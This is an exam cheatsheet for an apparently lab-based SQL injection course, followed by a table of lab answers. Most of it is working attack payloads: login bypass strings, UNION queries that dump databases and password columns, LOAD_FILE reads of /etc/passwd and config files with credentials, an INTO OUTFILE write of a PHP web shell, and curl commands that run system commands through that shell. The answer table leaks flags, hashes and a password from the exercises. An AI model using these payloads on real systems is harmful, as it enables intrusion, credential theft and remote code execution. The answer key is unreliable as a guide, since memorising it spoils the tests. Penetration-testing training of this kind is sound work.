# SQL Injection Fundamentals — Exam Cheatsheet

---

## Discovery

```bash
# Test for injection (any input field)
'       → SQL error or behavior change = injectable
"       → alternate quote test
' OR '1'='1    → auth bypass (string context)
' OR 1=1-- -   → auth bypass with comment
```

---

## Auth Bypass

```bash
# Known username
admin'-- -              # comment out password check
admin' OR '1'='1        # OR true condition

# Unknown username  
' OR '1'='1             # username field
' OR '1'='1             # password field (both)

# Parentheses in query: SELECT * FROM logins WHERE (username='INPUT')
admin')-- -             # close paren, comment rest
' OR id=5)-- -          # target specific user by ID
```

---

## UNION Injection (direct output)

```bash
# Step 1: Find column count
' ORDER BY 1-- -   # increment until error
' UNION SELECT NULL-- -   # increment NULLs until no error

# Step 2: Find visible columns
' UNION SELECT 1,2,3,4-- -   # numbers appear in output = visible positions

# Step 3: Extract data (put payload in visible column)
' UNION SELECT 1,@@version,3,4-- -
' UNION SELECT 1,user(),3,4-- -
' UNION SELECT 1,database(),3,4-- -
```

---

## Database Enumeration

```sql
-- List databases
UNION SELECT 1,schema_name,3,4 FROM information_schema.schemata-- -

-- List tables in a DB
UNION SELECT 1,TABLE_NAME,TABLE_SCHEMA,4 FROM information_schema.TABLES WHERE table_schema='dbname'-- -

-- List columns in a table
UNION SELECT 1,COLUMN_NAME,TABLE_NAME,4 FROM information_schema.COLUMNS WHERE table_name='tablename'-- -

-- Dump data (dot notation for cross-DB access)
UNION SELECT 1,username,password,4 FROM dbname.tablename-- -
```

---

## File Operations (requires FILE privilege)

```bash
# Check privilege
UNION SELECT 1,super_priv,3,4 FROM mysql.user WHERE user='root'-- -
UNION SELECT 1,variable_name,variable_value,4 FROM information_schema.global_variables WHERE variable_name='secure_file_priv'-- -

# Read file
UNION SELECT 1,LOAD_FILE('/etc/passwd'),3,4-- -
UNION SELECT 1,LOAD_FILE('/etc/nginx/sites-enabled/default'),3,4-- -   # → find webroot
UNION SELECT 1,LOAD_FILE('/var/www/html/config.php'),3,4-- -            # → DB creds

# Write file (test /tmp first, then webroot)
UNION SELECT "","<?php system($_REQUEST[0]); ?>","","" INTO OUTFILE '/var/www/html/shell.php'-- -
```

---

## Web Shell Usage

```bash
# Execute commands
curl "http://TARGET/shell.php?0=id"
curl "http://TARGET/shell.php?0=find+/+-maxdepth+4+-name+flag*+2>/dev/null"
curl "http://TARGET/shell.php?0=cat+/flag.txt"
```

---

## MySQL CLI Quick Reference

```bash
mysql -u root -pPASS -h TARGET -P PORT --skip-ssl -e "QUERY"

SHOW DATABASES;
USE dbname;
SHOW TABLES;
DESCRIBE tablename;
SELECT * FROM table WHERE col LIKE 'val%';
```

---

## Key Lab Answers

| Section | Question | Answer |
|---------|----------|--------|
| 4 | First DB in employees | `employees` |
| 5 | dept_no for Development | `d005` |
| 6 | Last name of Bar* hired 1990-01-01 | `Mitchem` |
| 7 | titles WHERE emp_no>10000 OR title not engineer | `654` |
| 9 | Flag after logging in as tom | `202a1d1a8b195d5e9a57e434cc16000c` |
| 10 | Flag for id=5 login | `cdad9ecdf6f14b45ff5c4de32909caec` |
| 11 | UNION of employees + departments | `663` |
| 12 | user() via UNION | `root@localhost` |
| 13 | newuser password hash | `9da2c9bcdf39d8610954e0e11ea8f45f` |
| 14 | DB password from config.php | `dB_pAssw0rd_iS_flag!` |
| 15 | Flag via web shell | `d2b5b27ae688b6a0f1d21b7d3a0798cd` |
| 17 Q1 | Admin password hash | `$argon2i$v=19$m=2048,t=4,p=3$dk4wdDBraE0zZVllcEUudA$CdU8zKxmToQybvtHfs1d5nHzjxw9DhkdcVToq6HTgvU` |
| 17 Q2 | Webroot | `/var/www/chattr-prod` |
| 17 Q3 | Flag via RCE | `061b1aeb94dec6bf5d9c27032b3c1d8d` |
